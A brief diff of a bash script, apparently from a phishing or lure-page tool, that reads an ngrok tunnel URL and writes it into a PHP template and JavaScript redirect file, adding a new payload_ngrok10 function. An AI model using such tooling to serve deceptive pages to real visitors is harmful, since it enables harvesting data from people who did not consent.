@@ -294,7 +294,7 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
-payload_ngrok1
+payload_ngrok10
 checkfound10
 
 }
@@ -454,10 +454,16 @@ payload_ngrok1() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+redirect_link+'$redirect_link'+g' js/_app1.js > js/app.js
+
+}
+payload_ngrok10() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' template.php > index.php
 sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
 }
-
 start4() {
 
 default_choose_sub="Y"
